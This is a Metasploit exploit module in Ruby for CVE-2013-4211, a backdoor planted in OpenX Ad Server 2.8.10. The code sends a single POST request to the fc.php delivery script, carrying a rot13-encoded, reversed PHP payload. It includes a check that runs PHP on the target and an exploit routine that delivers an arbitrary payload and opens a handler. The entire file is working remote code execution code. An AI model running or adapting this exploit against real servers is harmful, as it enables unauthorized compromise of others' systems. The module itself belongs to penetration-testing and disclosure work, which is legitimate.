##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##
 
require 'msf/core'
 
class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
 
  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'OpenX Backdoor PHP Code Execution',
      'Description'    => %q{
        OpenX Ad Server version 2.8.10 was shipped with an obfuscated
        backdoor since at least November 2012 through August 2013.
        Exploitation is simple, requiring only a single request with a
        rot13'd and reversed payload.
      },
      'Author'         =>
        [
          'egypt',   # Metasploit module, shouts to bperry for hooking 
me up with the vuln software
          'Unknown', # Someone planted this backdoor...
        ],
      'License'        => MSF_LICENSE,
      'References'     => [
          [ 'CVE', '2013-4211' ],
          [ 'URL', 
'http://www.heise.de/security/meldung/Achtung-Anzeigen-Server-OpenX-enthaelt-eine-Hintertuer-1929769.html'],
          [ 'URL', 
'http://forum.openx.org/index.php?showtopic=503521628'],
        ],
      'Privileged'     => false,
      'Payload'        =>
        {
          'DisableNops' => true,
          # Arbitrary big number. The payload gets sent as POST data, so
          # really it's unlimited
          'Space'       => 262144, # 256k
        },
      'DisclosureDate' => 'Aug 07 2013',
      'Platform'       => 'php',
      'Arch'           => ARCH_PHP,
      'Targets'        => [[ 'Generic (PHP payload)', { }]],
      'DefaultTarget' => 0))
 
    register_options([
      OptString.new('TARGETURI', [true, "The URI to request", 
"/openx/"]),
    ], self.class)
  end
 
  def check
    token = rand_text_alpha(20)
    response = execute_php("echo '#{token} '.phpversion();die();")
 
    if response.nil?
      CheckCode::Unknown
    elsif response.body =~ /#{token} ((:?\d\.?)+)/
      print_status("PHP Version #{$1}")
      return CheckCode::Vulnerable
    end
    return CheckCode::Safe
  end
 
  def exploit
    execute_php(payload.encoded)
 
    handler
  end
 
  def execute_php(php_code)
    money = rot13(php_code.reverse)
    begin
      response = send_request_cgi( {
        'method' => "POST",
        'global' => true,
        'uri'    => 
normalize_uri(target_uri.path,"www","delivery","fc.php"),
        'vars_get' => {
          'file_to_serve' => "flowplayer/3.1.1/flowplayer-3.1.1.min.js",
          'script' => 'deliveryLog:vastServeVideoPlayer:player'
        },
        'vars_post' => {
          'vastPlayer' => money
        },
      }, 0.1)
    rescue ::Rex::ConnectionError => e
      fail_with(Failure::Unreachable, e.message)
    rescue ::OpenSSL::SSL::SSLError
      fail_with(Failure::BadConfig, "The target failed to negotiate SSL, 
is this really an SSL service?")
    end
 
    response
  end
 
  def rot13(str)
    str.tr! "A-Za-z", "N-ZA-Mn-za-m"
  end
 
end
